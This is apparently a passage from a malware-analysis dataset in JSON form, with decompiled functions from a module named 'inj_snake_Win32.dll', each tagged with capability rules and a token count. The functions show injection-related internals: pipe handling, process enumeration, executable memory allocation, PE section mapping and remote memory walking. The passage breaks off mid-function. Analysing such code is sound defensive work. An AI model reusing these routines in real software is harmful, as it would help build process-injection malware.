        "decompiled_code": "\nint32_t __cdecl fcn.2000c291(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uchar auStackY12292 [8192];\n    uint var_1000h;\n    uint uStackY48;\n    uint uStackY44;\n    uint uStackY40;\n    uint uStackY36;\n    uint arg_14h;\n    \n    sub.ntdll.dll__chkstk();\n    while (pcVar1 = _sym.imp.KERNEL32.dll_PeekNamedPipe,  *0x2004716c == 0) {\ncode_r0x2000c2fc:\n        uStackY36 = *(arg_8h + 4);\n        uStackY40 = 0x2000c316;\n        iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)();\n        if ((iVar2 == 0) || (arg_8h == 0)) goto code_r0x2000c3da;\n        if (*(arg_8h + 0x10) == 1) {\ncode_r0x2000c354:\n            arg_14h = 0x200471e0;\n            *(&fcn.2000c291::var_1000h + arg_8h) = 0;\n            uStackY36 = 0x2000c37b;\n            fcn.20001d99(&fcn.2000c291::var_1000h, &stack0xffffcffc, 0x1000, arg_14h);\n            (*_sym.imp.ntdll.dll_wcslen)();\n        }\n        else if (*(arg_8h + 0x10) == 0) {\n            (*_sym.imp.USER32.dll_OemToCharBuffA)();\n            goto code_r0x2000c354;\n        }\n        uStackY36 = 0x2000c39f;\n        iVar2 = sym.inj_snake_Win32.dll_tr_write_pipe(*(arg_8h + 8));\n        if (iVar2 != 0) {\n            if (*(arg_8h + 0xc) == 0) {\n                (*_sym.imp.KERNEL32.dll_TerminateProcess)();\n            }\n            return iVar2;\n        }\n    }\n    uStackY36 = 0;\n    uStackY40 = *(arg_8h + 4);\n    uStackY44 = 0x2000c2c1;\n    iVar2 = (*_sym.imp.KERNEL32.dll_PeekNamedPipe)();\n    if (iVar2 != 0) {\n        if (arg_8h == 0) {\n            (*_sym.imp.KERNEL32.dll_Sleep)();\n            uStackY36 = 0;\n            uStackY40 = 0;\n            uStackY44 = *0x4;\n            uStackY48 = 0x2000c2e6;\n            iVar2 = (*pcVar1)();\n            if (iVar2 == 0) goto code_r0x2000c3da;\n            if (*0xc != 0) {\n                iVar2 = 0x21590006;\n                goto code_r0x2000c3c3;\n            }\n        }\n        goto code_r0x2000c2fc;\n    }\ncode_r0x2000c3da:\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\ncode_r0x2000c3c3:\n    uStackY36 = 0x2000c3ce;\n    sym.inj_snake_Win32.dll_tr_write_pipe(*(arg_8h + 8));\n    return iVar2;\n}\n",
        "token_count": 788
    },
    "2000c3e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2000c3e4(uint *arg_8h)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t arg_ch;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    puVar2 = arg_8h;\ncode_r0x2000c3f0:\n    while (iVar3 = sym.inj_snake_Win32.dll_tr_read_pipe(arg_8h[2]),  pcVar1 = _sym.imp.msvcrt.dll_malloc,  iVar3 != 0) {\n        if (iVar3 != 0x21590002) goto code_r0x2000c517;\n        if (arg_8h[3] != 0) {\n            arg_8h = 0x21590006;\n            iVar3 = arg_8h;\ncode_r0x2000c517:\n            arg_8h = iVar3;\n            if (puVar2[3] == 0) {\n                (*_sym.imp.KERNEL32.dll_TerminateProcess)(puVar2[5], 0xffffffff);\n            }\n            return arg_8h;\n        }\n    }\n    if (arg_8h[3] == 0) {\n        iVar3 = (*_sym.imp.msvcrt.dll_malloc)(var_8h + 2);\n        if (iVar3 != 0) {\n            sub.ntdll.dll_memcpy(iVar3, var_4h, var_8h);\n            *(iVar3 + (var_8h & 0xfffffffe)) = 0;\n            sym.inj_snake_Win32.dll_tr_free(arg_8h[2], var_4h, 0);\n            uVar4 = fcn.20001f33(iVar3, 0x200471e0);\n            arg_ch = (*pcVar1)(uVar4);\n            if (arg_ch == 0) {\n                arg_8h = 0x21590004;\n                (*_sym.imp.msvcrt.dll_free)(iVar3);\n                iVar3 = arg_8h;\n                goto code_r0x2000c517;\n            }\n            fcn.20001e44(iVar3, arg_ch, 0xffffffff, 0x200471e0);\n            pcVar1 = _sym.imp.msvcrt.dll_free;\n            (*_sym.imp.msvcrt.dll_free)(iVar3);\n            if (arg_8h[4] == 0) {\n                (*_sym.imp.USER32.dll_CharToOemA)(arg_ch, arg_ch);\n            }\n            uVar4 = sub.ntdll.dll_strlen(arg_ch, &var_ch, 0);\n            iVar3 = (*_sym.imp.KERNEL32.dll_WriteFile)(*arg_8h, arg_ch, uVar4);\n            if (iVar3 == 0) {\n                iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                (*pcVar1)(arg_ch);\n                goto code_r0x2000c517;\n            }\n            (*pcVar1)(arg_ch);\n            goto code_r0x2000c3f0;\n        }\n        arg_8h = 0x21590004;\n    }\n    else {\n        arg_8h = 0x21590006;\n    }\n    sym.inj_snake_Win32.dll_tr_free(puVar2[2], var_4h, 0);\n    iVar3 = arg_8h;\n    goto code_r0x2000c517;\n}\n",
        "token_count": 777
    },
    "2000c532": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2000c532(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    uint var_258h;\n    uint var_250h;\n    uint var_234h;\n    uint uStack564;\n    uint uStack560;\n    uint uStack556;\n    uint var_224h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint *var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_14h = 3;\n    var_14h = 0;\n    sub.ntdll.dll_memset(&var_10h, 0, 0x10);\n    var_ch = &var_2ch;\n    var_10h = 2;\n    var_2ch = 6;\n    var_28h = 2;\n    var_24h = 7;\n    var_20h = 4;\n    if (*0x20047168 == 0) {\n        iVar3 = (**0x20046e84)(2, 0);\n        if (iVar3 != -1) {\n            var_258h = 0x22c;\n            var_8h = 0;\n            iVar5 = (**0x20046e88)(iVar3, &var_258h);\n            while (iVar5 != 0) {\n                var_8h = var_8h + 1;\n                iVar5 = (**0x20046e8c)(iVar3, &var_258h);\n            }\n            var_4h = (*_sym.imp.msvcrt.dll_calloc)(var_8h, 4);\n            if (var_4h == 0) goto code_r0x2000c5ce;\n            iVar5 = (**0x20046e88)(iVar3, &var_258h);\n            if (iVar5 != 0) {\n                iVar5 = 0;\n                do {\n                    if (*0x2004716c == 0) {\n                        fcn.2000be79(var_250h, &var_234h);\n                    }\n                    iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&var_234h);\n                    iVar4 = iVar4 * 2 + 2;\n                    uVar7 = (*_sym.imp.msvcrt.dll_malloc)(var_10h * 0x10 + iVar4);\n                    *(iVar5 + var_4h) = uVar7;\n                    if (*(var_4h + iVar5) == 0) goto code_r0x2000c59e;\n                    sub.ntdll.dll_memset(*(var_4h + iVar5), 0, var_10h << 4);\n                    iVar1 = *(iVar5 + var_4h);\n                    *(iVar1 + 4) = iVar1 + 8;\n                    **(iVar5 + var_4h) = 4;\n                    **(*(iVar5 + var_4h) + 4) = var_250h;\n                    *(*(iVar5 + var_4h) + 0x14) = var_10h * 0x10 + iVar1;\n                    *(*(iVar5 + var_4h) + 0x10) = iVar4;\n                    (*_sym.imp.KERNEL32.dll_lstrcpyW)(*(*(iVar5 + var_4h) + 0x14), &var_234h);\n                    iVar5 = iVar5 + 4;\n                    iVar4 = (**0x20046e8c)(iVar3, &var_258h);\n                } while (iVar4 != 0);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n        }\ncode_r0x2000c828:\n        uVar7 = sym.inj_snake_Win32.dll_code_result_tbl(&var_10h, arg_18h, arg_1ch);\n    }\n    else {\n        var_14h = (*_sym.imp.msvcrt.dll_malloc)(0xa000);\n        if (var_14h != 0) {\n            (**0x20046e74)(var_14h, 0xa000, &var_1ch);\n            var_1ch = var_1ch >> 2;\n            var_8h = var_1ch;\n            var_4h = (*_sym.imp.msvcrt.dll_calloc)(var_1ch, 4);\n            if (var_4h == 0) {\ncode_r0x2000c5ce:\n                uVar7 = 0x21590004;\n                goto code_r0x2000c85b;\n            }\n            arg_14h = NULL;\n            if (var_1ch != 0) {\n                do {\n                    var_234h = str.unknown._0_4_;\n                    uStack564 = str.unknown._4_4_;\n                    uStack560 = str.unknown._8_4_;\n                    uStack556 = str.unknown._12_4_;\n                    sub.ntdll.dll_memset(&var_224h, 0, 0x1f8);\n                    iVar5 = arg_14h * 4;\n                    var_18h = var_14h + iVar5;\n                    fcn.2000be79(*var_18h, &var_234h);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&var_234h);\n                    iVar3 = iVar3 * 2 + 2;\n                    uVar7 = (*_sym.imp.msvcrt.dll_malloc)(var_10h * 0x10 + iVar3);\n                    *(iVar5 + var_4h) = uVar7;\n                    if (*(var_4h + iVar5) == 0) goto code_r0x2000c59e;\n                    sub.ntdll.dll_memset(*(var_4h + iVar5), 0, var_10h << 4);\n                    iVar4 = *(iVar5 + var_4h);\n                    *(iVar4 + 4) = iVar4 + 8;\n                    **(iVar5 + var_4h) = 4;\n                    **(*(iVar5 + var_4h) + 4) = *var_18h;\n                    *(*(iVar5 + var_4h) + 0x14) = var_10h * 0x10 + iVar4;\n                    *(*(iVar5 + var_4h) + 0x10) = iVar3;\n                    (*_sym.imp.KERNEL32.dll_lstrcpyW)(*(*(iVar5 + var_4h) + 0x14), &var_234h);\n                    arg_14h = arg_14h + 1;\n                } while (arg_14h < var_1ch);\n            }\n            goto code_r0x2000c828;\n        }\ncode_r0x2000c59e:\n        uVar7 = 0x21590004;\n    }\n    uVar6 = 0;\n    if ((var_4h != 0) && (var_8h != 0)) {\n        do {\n            (*_sym.imp.msvcrt.dll_free)(*(var_4h + uVar6 * 4));\n            uVar6 = uVar6 + 1;\n        } while (uVar6 < var_8h);\n    }\ncode_r0x2000c85b:\n    pcVar2 = _sym.imp.msvcrt.dll_free;\n    (*_sym.imp.msvcrt.dll_free)(var_4h);\n    (*pcVar2)(var_14h);\n    return uVar7;\n}\n",
        "token_count": 1756
    },
    "2000d490": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.2000d490(uint s2, uint32_t ptr, uint arg_10h, uint8_t *arg_14h, int32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    int32_t arg_ch;\n    uint32_t uVar2;\n    uint var_8ch;\n    uint32_t s1;\n    \n    if (ptr < 8) {\n        sub.ntdll.dll_memset(&s1, 0);\n        sub.ntdll.dll_memcpy(&s1, s2, ptr);\n    }\n    else {\n        sub.ntdll.dll_memcpy(&s1, s2, 8);\n    }\n    uVar1 = *arg_14h;\n    uVar2 = (arg_18h - uVar1) - 1;\n    s1 = s1 ^ uVar2;\n    if (uVar2 != 0) {\n        fcn.200146b9(&var_8ch, ptr, s2);\n        if (uVar1 == 0) {\n            fcn.200142cd(arg_14h + 1, arg_10h, arg_18h + -1, &var_8ch, &s1, 0);\n        }\n        else {\n            arg_ch = (*_sym.imp.msvcrt.dll_malloc)(arg_18h + -1);\n            if (arg_ch == 0) {\n                uVar2 = 0xffffffff;\n            }\n            else {\n                fcn.200142cd(arg_14h + 1, arg_ch, arg_18h + -1, &var_8ch, &s1, 0);\n                sub.ntdll.dll_memcpy(arg_10h, arg_ch, uVar2);\n                (*_sym.imp.msvcrt.dll_free)(arg_ch);\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 403
    },
    "2000d921": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2000d921(uint arg_8h, uint *arg_ch, int32_t *arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    pcVar1 = _sym.imp.ntdll.dll_ZwAllocateVirtualMemory;\n    if (arg_ch == NULL) {\n        iVar2 = 0x21590066;\n    }\n    else if ((arg_10h == NULL) || (*arg_10h == 0)) {\n        iVar2 = 0x21590067;\n    }\n    else {\n        iVar2 = (*_sym.imp.ntdll.dll_ZwAllocateVirtualMemory)(arg_8h, arg_ch, 0, arg_10h, 0x2000, 0x40);\n        if (iVar2 != 0) {\n            *arg_ch = 0;\n            iVar2 = (*pcVar1)(arg_8h, arg_ch, 0, arg_10h, 0x2000, 0x40);\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n        iVar2 = (*pcVar1)(arg_8h, arg_ch, 0, arg_10h, 0x1000, 0x40);\n    }\n    return iVar2;\n}\n",
        "token_count": 287
    },
    "2000dc1f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2000dc1f(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t var_4h;\n    \n    iVar4 = *(arg_ch + 0x3c) + arg_ch;\n    uVar2 = *(iVar4 + 0x38);\n    fcn.20001829(arg_8h, arg_ch, *(iVar4 + 0x54));\n    var_4h = 0;\n    piVar1 = *(iVar4 + 0x14) + iVar4;\n    if (*(iVar4 + 6) != 0) {\n        do {\n            iVar3 = piVar1[10];\n            if (iVar3 != 0) {\n                iVar3 = fcn.2000dad4(piVar1[9], uVar2, piVar1[0xb] + arg_ch, iVar3);\n                fcn.20001829(iVar3 + arg_8h);\n            }\n            var_4h = var_4h + 1;\n            piVar1 = piVar1 + 10;\n        } while (var_4h < *(iVar4 + 6));\n    }\n    return 0;\n}\n",
        "token_count": 289
    },
    "2000dd81": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.2000dd81(int32_t arg_8h, uint s2, int32_t arg_10h, int32_t *nbyte, uint *arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t arg_8h_00;\n    char16_t *pcVar4;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t fildes;\n    int32_t var_8h;\n    uint var_1h;\n    \n    pcVar1 = _sym.imp.msvcrt.dll__wopen;\n    arg_8h_00 = 0;\n    var_14h = 0;\n    var_10h = 0;\n    *nbyte = 0;\n    fildes = (*pcVar1)(s2, 0x8000, 0);\n    if (fildes == -1) {\n        arg_8h_00 = (*_sym.imp.msvcrt.dll_malloc)(0x208);\n        if (arg_8h_00 == 0) {\n            return 0x21590004;\n        }\n        var_8h = fcn.200016d4(arg_8h_00, 0x104);\n        if (var_8h == 0) {\n            if (arg_8h == 0) {\n                var_1h._0_1_ = '\\0';\n            }\n            else {\n                var_8h = fcn.2000d9af(&var_14h, 0x400, arg_8h);\n                if ((var_8h != 0) || (var_8h = fcn.2000d849(0xffffffff, &var_1h),  var_8h != 0)) goto code_r0x2000de1f;\n            }\n            iVar2 = (*_sym.imp.ntdll.dll_wcslen)(arg_8h_00);\n            if (var_1h == '\\0') {\n                pcVar4 = L\"\\\\System32\\\\\";\n            }\n            else {\n                pcVar4 = L\"\\\\SysWOW64\\\\\";\n            }\n            (*_sym.imp.ntdll.dll_wcsncat)(arg_8h_00, pcVar4, 0x104 - iVar2);\n            iVar2 = (*_sym.imp.ntdll.dll_wcslen)(arg_8h_00);\n            (*_sym.imp.ntdll.dll_wcsncat)(arg_8h_00, s2, 0x104 - iVar2);\n            *(arg_8h_00 + 0x206) = 0;\n            fildes = (*pcVar1)(arg_8h_00, 0, 0);\n            if (fildes != -1) goto code_r0x2000dec4;\n            var_8h = 0x21590005;\n        }\n    }\n    else {\ncode_r0x2000dec4:\n        iVar2 = (*_sym.imp.msvcrt.dll__filelength)(fildes);\n        pcVar1 = _sym.imp.msvcrt.dll_malloc;\n        if (iVar2 == -1) {\ncode_r0x2000ded6:\n            var_8h = -1;\n        }\n        else {\n            var_10h = (*_sym.imp.msvcrt.dll_malloc)(iVar2);\n            if (var_10h != 0) {\n                iVar2 = (*_sym.imp.msvcrt.dll__read)(fildes, var_10h, iVar2);\n                if (iVar2 == -1) goto code_r0x2000ded6;\n                uVar3 = fcn.2000dbc8(var_10h);\n                iVar2 = (*pcVar1)(uVar3);\n                *nbyte = iVar2;\n                if (iVar2 != 0) {\n                    var_8h = fcn.2000dc1f(iVar2, var_10h);\n                    if (var_8h == 0) {\n                        if (arg_10h == 0) {\n                            arg_10h = *nbyte;\n                        }\n                        var_8h = fcn.2000daee(*nbyte, arg_10h);\n                        if (var_8h == 0) {\n                            if (arg_18h != NULL) {\n                                *arg_18h = uVar3;\n                            }\n                            goto code_r0x2000de2b;\n                        }\n                    }\n                    goto code_r0x2000de1f;\n                }\n            }\n            var_8h = 0x21590004;\n        }\n    }\ncode_r0x2000de1f:\n    (*_sym.imp.msvcrt.dll_free)(*nbyte);\n    *nbyte = 0;\ncode_r0x2000de2b:\n    pcVar1 = _sym.imp.msvcrt.dll_free;\n    (*_sym.imp.msvcrt.dll_free)(var_10h);\n    fcn.2000d9e0(var_14h);\n    (*pcVar1)(arg_8h_00);\n    if (fildes != -1) {\n        (*_sym.imp.msvcrt.dll__close)(fildes);\n    }\n    return var_8h;\n}\n",
        "token_count": 1180
    },
    "2000ef7a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_19h\n\nvoid __cdecl fcn.2000ef7a(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_150h;\n    uint var_134h;\n    uint var_110h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_b0h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_48h;\n    uint var_38h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_19h;\n    uint var_4h;\n    \n    fcn.20011888(0x20032458, 0x140);\n    *(unaff_EBP + -0x28) = 0;\n    piVar1 = *(unaff_EBP + 0xc);\n    if ((piVar1 == NULL) || (*piVar1 == 0)) goto code_r0x2000f1ae;\n    iVar2 = fcn.2000d9af(unaff_EBP + -0x28, 0x438, *(unaff_EBP + 8));\n    *(unaff_EBP + -0x20) = iVar2;\n    arg_8h_00 = *(unaff_EBP + -0x28);\n    if (iVar2 == 0) {\n        iVar2 = fcn.2000d881(arg_8h_00, unaff_EBP + -0x19);\n        *(unaff_EBP + -0x20) = iVar2;\n        if (iVar2 == 0) {\n            *(unaff_EBP + -0x19) = *(unaff_EBP + -0x19) == '\\0';\n            iVar2 = fcn.2000e856(arg_8h_00, unaff_EBP + -0x24);\n            *(unaff_EBP + -0x20) = iVar2;\n            if (iVar2 == 0) {\n                *(unaff_EBP + -4) = 0;\n                if (*(unaff_EBP + -0x19) == '\\0') {\n                    iVar2 = fcn.2000d8f1(arg_8h_00, *(unaff_EBP + -0x24), 0, unaff_EBP + -0x38, 0x10);\n                    *(unaff_EBP + -0x20) = iVar2;\n                    if (iVar2 == 0) {\n                        iVar2 = *(unaff_EBP + -0x2c);\n                        *(unaff_EBP + -0x24) = iVar2;\n                        if (iVar2 == 0) goto code_r0x2000f033;\n                        iVar2 = fcn.2000d8f1(arg_8h_00, iVar2, 0, unaff_EBP + -0x134, 0x24);\n                        *(unaff_EBP + -0x20) = iVar2;\n                        if (iVar2 == 0) {\n                            iVar2 = fcn.2000d8f1(arg_8h_00, *piVar1, 0, unaff_EBP + -0xb0, 0x48);\n                            *(unaff_EBP + -0x20) = iVar2;\n                            if (iVar2 == 0) {\n                                fcn.2000e34b();\n                                fcn.2000e34b();\n                                if ((*(unaff_EBP + -0xa0) != 0) && (*(unaff_EBP + -0x9c) != 0)) {\n                                    fcn.2000e34b();\n                                }\n                                goto code_r0x2000f175;\n                            }\n                        }\n                    }\n                }\n                else {\n                    iVar2 = fcn.2000d8f1(arg_8h_00, *(unaff_EBP + -0x24), 0, unaff_EBP + -0x48, 0x20);\n                    *(unaff_EBP + -0x20) = iVar2;\n                    if (iVar2 == 0) {\n                        iVar2 = *(unaff_EBP + -0x30);\n                        *(unaff_EBP + -0x24) = iVar2;\n                        if (iVar2 == 0) {\ncode_r0x2000f033:\n                            *(unaff_EBP + -0x20) = 0xffffffff;\n                        }\n                        else {\n                            iVar2 = fcn.2000d8f1(arg_8h_00, iVar2, 0, unaff_EBP + -0x150, 0x40);\n                            *(unaff_EBP + -0x20) = iVar2;\n                            if (iVar2 == 0) {\n                                iVar2 = *piVar1;\n                                iVar3 = fcn.2000d8f1(arg_8h_00, iVar2, 0, unaff_EBP + -0x110, 0x88);\n                                *(unaff_EBP + -0x20) = iVar3;\n                                if (iVar3 == 0) {\n                                    fcn.2000e270(iVar2);\n                                    fcn.2000e270(iVar2 + 0x10);\n                                    if (((*(unaff_EBP + -0xf0) | *(unaff_EBP + -0xec)) != 0) &&\n                                       ((*(unaff_EBP + -0xe8) | *(unaff_EBP + -0xe4)) != 0)) {\n                                        fcn.2000e270(iVar2 + 0x20);\n                                    }\ncode_r0x2000f175:\n                                    **(unaff_EBP + 0xc) = 0;\n                                    *(unaff_EBP + -0x20) = 0;\n                                }\n                            }\n                        }\n                    }\n                }\n                *(unaff_EBP + -4) = 0xffffffff;\n            }\n        }\n    }\n    if (arg_8h_00 != 0) {\n        (*_sym.imp.ntdll.dll_ZwClose)(arg_8h_00);\n    }\ncode_r0x2000f1ae:\n    fcn.200118c3();\n    return;\n}\n",
        "token_count": 1439
    },
    "2000f9ac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.2000f9ac(uint arg_8h, uint s, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint32_t uVar5;\n    bool bVar6;\n    uint var_1a4h;\n    uint var_174h;\n    uint var_15ch;\n    uint var_14ch;\n    uint var_dch;\n    uint var_c4h;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_94h;\n    uint var_74h;\n    uint var_70h;\n    uint var_60h;\n    uint var_58h;\n    uint var_50h;\n    uint var_44h;\n    uint var_40h;\n    uint var_38h;\n    uint var_34h;\n    uint ptr;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1dh;\n    uint var_4h;\n    \n    fcn.20011888(0x20032498, 0x194);\n    iVar2 = (*_sym.imp.ntdll.dll_wcslen)(*(unaff_EBP + 0xc));\n    *(unaff_EBP + -0x38) = iVar2 * 2;\n    *(unaff_EBP + -0x24) = 0;\n    if ((*(unaff_EBP + 0xc) == 0) || (*(unaff_EBP + 0x18) == NULL)) goto code_r0x2000fde7;\n    **(unaff_EBP + 0x18) = 0;\n    iVar2 = (*_sym.imp.msvcrt.dll_malloc)(0x20a);\n    *(unaff_EBP + -0x30) = iVar2;\n    if (iVar2 == 0) goto code_r0x2000fde7;\n    iVar2 = fcn.2000d9af(unaff_EBP + -0x24, 0x438, *(unaff_EBP + 8));\n    if (iVar2 == 0) {\n        uVar4 = *(unaff_EBP + -0x24);\n        iVar2 = fcn.2000d881(uVar4, unaff_EBP + -0x1d);\n        if (iVar2 == 0) {\n            bVar6 = *(unaff_EBP + -0x1d) == '\\0';\n            iVar2 = fcn.2000d849(uVar4, unaff_EBP + -0x1d);\n            if (iVar2 == 0) {\n                if (*(unaff_EBP + 0x14) == '\\0') {\n                    iVar2 = fcn.2000e856(uVar4, unaff_EBP + -0x28);\n                }\n                else {\n                    iVar2 = fcn.2000e856(uVar4, unaff_EBP + -0x28);\n                }\n                if (iVar2 == 0) {\n                    *(unaff_EBP + -4) = 0;\n                    if ((bVar6) || ((*(unaff_EBP + -0x1d) != bVar6 && (*(unaff_EBP + 0x14) != bVar6)))) {\n                        iVar2 = fcn.2000d8f1(uVar4, *(unaff_EBP + -0x28), 0, unaff_EBP + -0x70, 0x20);\n                        *(unaff_EBP + -0x1c) = iVar2;\n                        if (iVar2 == 0) {\n                            iVar2 = *(unaff_EBP + -0x58);\n                            *(unaff_EBP + -0x34) = iVar2;\n                            if (iVar2 == 0) goto code_r0x2000fc41;\n                            iVar2 = fcn.2000d8f1(uVar4, iVar2, 0, unaff_EBP + -0xb4, 0x40);\n                            *(unaff_EBP + -0x1c) = iVar2;\n                            if (iVar2 == 0) {\n                                iVar2 = unaff_EBP + -0x15c;\n                                if (*(unaff_EBP + 0x10) == '\\0') {\n                                    iVar2 = unaff_EBP + -0x14c;\n                                }\n                                *(unaff_EBP + -0x28) = iVar2;\n                                iVar2 = *(unaff_EBP + -0x94);\n                                while (iVar2 != *(unaff_EBP + -0x34) + 0x20) {\n                                    iVar3 = fcn.2000d8f1(*(unaff_EBP + -0x24), iVar2, 0, unaff_EBP + -0x50, 0x10);\n                                    *(unaff_EBP + -0x1c) = iVar3;\n                                    if (iVar3 != 0) goto code_r0x2000fdc8;\n                                    iVar3 = fcn.2000d8f1(*(unaff_EBP + -0x24), iVar2 + -0x10, 0, unaff_EBP + -0x1a4, \n                                                         0x88);\n                                    *(unaff_EBP + -0x1c) = iVar3;\n                                    if (iVar3 != 0) goto code_r0x2000fdc8;\n                                    uVar1 = **(unaff_EBP + -0x28);\n                                    if (*(unaff_EBP + -0x38) == uVar1) {\n                                        if ((uVar1 & 0xfffe) < 0x208) {\n                                            uVar5 = uVar1 >> 1;\n                                        }\n                                        else {\n                                            uVar5 = 0x104;\n                                        }\n                                        iVar3 = fcn.2000d8f1(*(unaff_EBP + -0x24), *(*(unaff_EBP + -0x28) + 8), \n                                                             *(*(unaff_EBP + -0x28) + 0xc), *(unaff_EBP + -0x30), \n                                                             uVar5 * 2);\n                                        if (iVar3 == 0) {\n                                            iVar3 = *(unaff_EBP + -0x30);\n                                            *(uVar5 * 2 + iVar3) = 0;\n                                            iVar3 = (*_sym.imp.ntdll.dll__wcsnicmp)(iVar3, *(unaff_EBP + 0xc), uVar5);\n                                            if (iVar3 == 0) {\n                                                iVar3 = fcn.2000d8f1(*(unaff_EBP + -0x24), iVar2 + 0x5c, 0, \n                                                                     unaff_EBP + -0x2c, 2);\n                                                *(unaff_EBP + -0x1c) = iVar3;\n                                                if (iVar3 != 0) goto code_r0x2000fdc8;\n                                                if (*(unaff_EBP + -0x2c) != -1) {\n                                                    *(unaff_EBP + -0x2c) = *(unaff_EBP + -0x2c) + 1;\n                                                    iVar2 = fcn.2000d909(*(unaff_EBP + -0x24), iVar2 + 0x5c, 0, \n                                                                         unaff_EBP + -0x2c, 2);\n                                                    *(unaff_EBP + -0x1c) = iVar2;\n                                                    if (iVar2 != 0) goto code_r0x2000fdc8;\n                                                }\n                                                uVar4 = *(unaff_EBP + -0x174);\n                                                goto code_r0x2000fd95;\n                                            }\n                                        }\n                                    }\n                                    iVar2 = *(unaff_EBP + -0x50);\n                                }\ncode_r0x2000fd9a:\n                                *(unaff_EBP + -0x1c) = (-(**(unaff_EBP + 0x18) != 0) & 0xdea6fffb) + 0x21590005;\n                            }\n                        }\n                    }\n                    else {\n                        iVar2 = fcn.2000d8f1(uVar4, *(unaff_EBP + -0x28), 0, unaff_EBP + -0x50, 0x10);\n                        *(unaff_EBP + -0x1c) = iVar2;\n                        if (iVar2 == 0) {\n                            iVar2 = *(unaff_EBP + -0x44);\n                            *(unaff_EBP + -0x34) = iVar2;\n                            if (iVar2 == 0) {\ncode_r0x2000fc41:\n                                *(unaff_EBP + 